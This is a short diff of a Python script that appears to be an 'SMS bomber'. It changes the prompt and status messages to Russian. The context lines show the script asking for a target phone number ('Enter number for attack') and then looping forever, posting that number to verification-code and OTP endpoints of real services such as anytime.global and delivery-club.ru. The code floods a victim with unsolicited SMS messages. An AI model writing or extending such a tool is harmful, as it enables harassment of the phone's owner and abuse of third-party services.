@@ -35,7 +35,7 @@ def slowprint(s):
         time.sleep(5. / 100)
 
 
-_phone = input('Hello! Enter number for attack (79xxxxxxxxx)-->> ')
+_phone = input('введите номер телефона, без + (79xxxxxxxxx)-->> ')
 
 if  _phone[0] == '+':
 	_phone = _phone[1:]
@@ -347,7 +347,7 @@ while True:
 		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
 		print('[+] SMS отправлено!')
 	except:
-		print('[-] Не отправлено!')
+		print('[-] SMS Не отправлено!')
 
 	try:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
